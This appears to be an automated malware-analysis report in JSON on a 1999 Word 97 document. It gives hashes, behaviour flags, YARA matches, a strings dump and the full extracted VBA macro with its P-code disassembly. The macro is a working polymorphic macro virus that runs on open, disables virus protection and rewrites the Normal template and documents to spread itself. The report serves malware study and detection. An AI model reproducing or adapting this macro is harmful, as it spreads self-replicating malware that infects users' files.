{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "ADdfRomsTriNg": "May attempt to modify the VBA code",
            "Chr": "May attempt to obfuscate specific str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBProject": "May attempt to modify the VBA code",
            "codeMoDulE": "May attempt to modify the VBA code",
            "document_OPen": "Runs when the Word or Publisher document is opened",
            "vbComPonENTS": "May attempt to modify the VBA code"
        },
        "macro": "Private Sub document_OPen()\nOn Error Resume Next\nOptions.VirusProtection = 0: EnableCancelKey = 0\nSet MAci = MacroContainer.VBProject.vbComPonENTS.Item(1)\nSet MACIc = MAci.codeMoDulE\nmI = Left(MACIc.lines(1, 1), 21)\nSet iNF = NormalTemplate: mIY = mI + \"ClOsE\"\nIf MacroContainer = iNF Then Set iNF = ActiveDocument: mIY = mI + \"Open\"\nSet Infc = iNF.VBProject.vbComPonENTS\nSet InFi = Infc.Item(1)\nSet inFIC = InFi.codeMoDulE\nS = UCase$(MACIc.lines(1, 25))\nFor kU = 1 To Len(S)\nT = Mid(S, kU, 1)\nIf Asc(T) < 90 And Asc(T) > 65 Then T = Chr$(Asc(T) + Int(Rnd * 2) * 32)\nP = P & T\nNext kU\nMACIc.dElEtElInes 1, 25\nMACIc.ADdfRomsTriNg P\nFor Ik = 2 To Infc.Count: Infc.Remove Infc.Item(2): Next Ik\ninFIC.dElEtElInes 1, inFIC.CoUNtOFLInES\ninFIC.ADdfRomsTriNg P\ninFIC.ReplAcElinE 1, mIY\nActiveDocument.SaveAs FileName:=ActiveDocument.FullName\nEnd Sub 'SeLFteXTpOLymORPHism (stP-demo) V1.1 3:16pM Tue MAY 18 99\n\n' Processing file: VirusShare_46244118e54b7cb4a201e5046693a59d\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 3168 bytes\n' Line #0:\n' \tFuncDefn (Private Sub document_OPen())\n' Line #1:\n' \tOnError (Resume Next) \n' Line #2:\n' \tLitDI2 0x0000 \n' \tLd Options \n' \tMemSt VirusProtection \n' \tBoS 0x0000 \n' \tLitDI2 0x0000 \n' \tSt EnableCancelKey \n' Line #3:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd MacroContainer \n' \tMemLd VBProject \n' \tMemLd vbComPonENTS \n' \tArgsMemLd Item 0x0001 \n' \tSet MAci \n' Line #4:\n' \tSetStmt \n' \tLd MAci \n' \tMemLd codeMoDulE \n' \tSet MACIc \n' Line #5:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd MACIc \n' \tArgsMemLd lines 0x0002 \n' \tLitDI2 0x0015 \n' \tArgsLd LBound 0x0002 \n' \tSt mI \n' Line #6:\n' \tSetStmt \n' \tLd NormalTemplate \n' \tSet iNF \n' \tBoS 0x0000 \n' \tLd mI \n' \tLitStr 0x0005 \"ClOsE\"\n' \tAdd \n' \tSt mIY \n' Line #7:\n' \tLd MacroContainer \n' \tLd iNF \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tSetStmt \n' \tLd ActiveDocument \n' \tSet iNF \n' \tBoS 0x0000 \n' \tLd mI \n' \tLitStr 0x0004 \"Open\"\n' \tAdd \n' \tSt mIY \n' \tEndIf \n' Line #8:\n' \tSetStmt \n' \tLd iNF \n' \tMemLd VBProject \n' \tMemLd vbComPonENTS \n' \tSet Infc \n' Line #9:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd Infc \n' \tArgsMemLd Item 0x0001 \n' \tSet InFi \n' Line #10:\n' \tSetStmt \n' \tLd InFi \n' \tMemLd codeMoDulE \n' \tSet inFIC \n' Line #11:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0019 \n' \tLd MACIc \n' \tArgsMemLd lines 0x0002 \n' \tArgsLd UCase$ 0x0001 \n' \tSt S \n' Line #12:\n' \tStartForVariable \n' \tLd kU \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd S \n' \tFnLen \n' \tFor \n' Line #13:\n' \tLd S \n' \tLd kU \n' \tLitDI2 0x0001 \n' \tArgsLd Mid$ 0x0003 \n' \tSt T \n' Line #14:\n' \tLd T \n' \tArgsLd Asc 0x0001 \n' \tLitDI2 0x005A \n' \tLt \n' \tLd T \n' \tArgsLd Asc 0x0001 \n' \tLitDI2 0x0041 \n' \tGt \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLd T \n' \tArgsLd Asc 0x0001 \n' \tLd Rnd \n' \tLitDI2 0x0002 \n' \tMul \n' \tFnInt \n' \tLitDI2 0x0020 \n' \tMul \n' \tAdd \n' \tArgsLd Chr$ 0x0001 \n' \tSt T \n' \tEndIf \n' Line #15:\n' \tLd P \n' \tLd T \n' \tConcat \n' \tSt P \n' Line #16:\n' \tStartForVariable \n' \tLd kU \n' \tEndForVariable \n' \tNextVar \n' Line #17:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0019 \n' \tLd MACIc \n' \tArgsMemCall dElEtElInes 0x0002 \n' Line #18:\n' \tLd P \n' \tLd MACIc \n' \tArgsMemCall ADdfRomsTriNg 0x0001 \n' Line #19:\n' \tStartForVariable \n' \tLd Ik \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLd Infc \n' \tMemLd Count \n' \tFor \n' \tBoS 0x0000 \n' \tLitDI2 0x0002 \n' \tLd Infc \n' \tArgsMemLd Item 0x0001 \n' \tLd Infc \n' \tArgsMemCall Remove 0x0001 \n' \tBoS 0x0000 \n' \tStartForVariable \n' \tLd Ik \n' \tEndForVariable \n' \tNextVar \n' Line #20:\n' \tLitDI2 0x0001 \n' \tLd inFIC \n' \tMemLd CoUNtOFLInES \n' \tLd inFIC \n' \tArgsMemCall dElEtElInes 0x0002 \n' Line #21:\n' \tLd P \n' \tLd inFIC \n' \tArgsMemCall ADdfRomsTriNg 0x0001 \n' Line #22:\n' \tLitDI2 0x0001 \n' \tLd mIY \n' \tLd inFIC \n' \tArgsMemCall ReplAcElinE 0x0002 \n' Line #23:\n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0001 \n' Line #24:\n' \tEndSub \n' \tQuoteRem 0x0008 0x0039 \"SeLFteXTpOLymORPHism (stP-demo) V1.1 3:16pM Tue MAY 18 99\"\n"
    },
    "filename": "VirusShare_46244118e54b7cb4a201e5046693a59d",
    "filesize": 32256,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Unbekannt, Template: Normal, Last Saved By: Unbekannt, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sat Jun 19 08:30:00 1999, Last Saved Time/Date: Sat Jun 19 08:30:00 1999, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "46244118e54b7cb4a201e5046693a59d",
        "sha1": "929e3f6bfc4fec52bdb6e9b7a6662f4076a037dc",
        "sha256": "794c6ccb3da84144f94c01554637e7b757602adb6e1a44d53fa89f429476d90b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            ". A!",
            "^6^6",
            "Unbekannt",
            "Normal",
            "Unbekannt",
            "Microsoft Word 8.0",
            "Titel",
            "_PID_GUID",
            "@3%A",
            "@3%D",
            "0046",
            "dll#0",
            "soft",
            "ClOsE",
            "Open",
            ".lnk",
            "SeLFteXTpOLymORPHism (stP-demo) V1.1 3:16pM Tue MAY 18 99",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            "VCreata",
            "`False",
            "Predecl",
            "xTru",
            "\"Expose",
            "Template Deriv",
            "$Customiz",
            "8 Sub ",
            "dt_OPen(",
            "On Error Res  Next",
            "ions.Vir",
            "usProtec",
            "[0: En",
            "CancelKe",
            "Set ",
            "MAci",
            "roContai@ner.VB",
            " .vbComP",
            "onENTS.I`tem(1@",
            " .cod",
            "eMoDulE",
            "LeftH(MA",
            "(1, 1), 2",
            "\u0485`: mIY",
            " + \"ClOsE",
            "8If '@",
            "ThXen A\"",
            "A;ve",
            "Open@",
            "InfA-",
            "T9E8InFEA",
            "=inFIC@ ",
            "UC@$=25)%LF",
            "\t1 PTo LrS@",
            "Mid(S, $kUH",
            "c(T) < 9@0 And ",
            ">0 65 =",
            "r$(D",
            "+ In",
            "* 2) * 32",
            "P & T",
            "ddElE",
            "tElInes \t@f25",
            "ADdf",
            "RomsTriN g P",
            "2-CCoun",
            "fc.Re0move",
            "CoUNtOFLInES",
            "ReplAczEHE",
            "`Dt=.",
            "SaveAs FHile:=A.",
            "Full",
            "`$j'SeLFt",
            "eXTpOLym",
            "ORPHism @(stP-d`",
            " V1.1 3:",
            "16pM Tue",
            " eY 18 99",
            "MEk7",
            "36376b4704",
            "Resume",
            "then",
            "Wordk",
            "Win16~",
            "Win32",
            "Projekt1A",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Documentj",
            "document_OPen",
            "Options",
            "VirusProtectionoD",
            "EnableCancelKey",
            "MAci+",
            "MacroContainer>",
            "VBProjectOh",
            "vbComPonENTS",
            "Itemz",
            "MACIc",
            "codeMoDulE",
            "mI?^",
            "lines",
            "iNF3",
            "NormalTemplateq",
            "ActiveDocument\\",
            "InfcZ",
            "InFiZ",
            "inFIC\"",
            "UCase5",
            "Asc!u",
            "ChrK~",
            "RndR",
            "dElEtElInes",
            "ADdfRomsTriNg",
            "Count0v",
            "Remove\u03f1",
            "CoUNtOFLInES!\\",
            "ReplAcElinE",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "_B_var_EnableCancelKey}",
            "_B_var_maci",
            "_B_var_macic",
            "_B_var_LeftQ",
            "_B_var_mi",
            "_B_var_infD\\",
            "_B_var_miyp",
            "_B_var_infcH",
            "_B_var_infiN",
            "_B_var_infic",
            "_B_str_UCaseK",
            "_B_var_s",
            "_B_var_ku",
            "_B_var_Midp",
            "_B_var_t",
            "_B_str_Chrm#",
            "_B_var_p",
            "_B_var_ikU",
            "dOCumEnt_ClOse7\\",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "StdOle2.",
            "tlb#OLE ",
            "Automati,on",
            "Forms>",
            "F4AF9",
            "17C2-146",
            "4-11D3-A",
            "K40339`3BF25",
            "TWD#Micr@osoft ",
            "` Ob",
            " Library",
            ",PJP\\VBE\\\t(EX(.E",
            "CxN@UTalCxNTax",
            " +\t,C",
            "@MEk7",
            "OPfficDO@fP",
            "G{2DF8D",
            "04C-5BFA",
            "-101B-BDE5@AA@4",
            "fPROGRA",
            "<ICROS",
            "OFT OFFI",
            "MSO9`7.DLLHj\" (8.0j",
            "isDocument",
            "h@5s",
            "1Z(I",
            "Ty\"B",
            "*\\CNormalrU",
            "Projekt1",
            "ThisDocument",
            "Project",
            "C:\\PROGRAMME\\GEMEINSAME DATEIEN\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\StdOle2.tlb",
            "stdole",
            "Document",
            "document_open",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "VBProject",
            "vbcomponents",
            "Item",
            "codemodule",
            "VBA332.DLL",
            "lines",
            "close",
            "open",
            "deletelines",
            "addfromstring",
            "Count",
            "Remove",
            "countoflines",
            "replaceline",
            "dOCumEnt_OpEn,",
            "ThisDocument",
            "ID=\"{77121F3D-2628-11D3-ABD0-00403393BF25}\"",
            "Document=ThisDocument/&H00000000",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"1B198948684C684C684C684C\"",
            "DPB=\"FEFC6C6DACB38EB48EB48E\"",
            "GC=\"E1E373747474748B\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=22, 22, 469, 357, Z",
            "Microsoft Word-Dokument",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\PROGRAMME\\GEMEINSAME DATEIEN\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\PROGRAMME\\MICROSOFT OFFICE\\OFFICE\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.280023",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
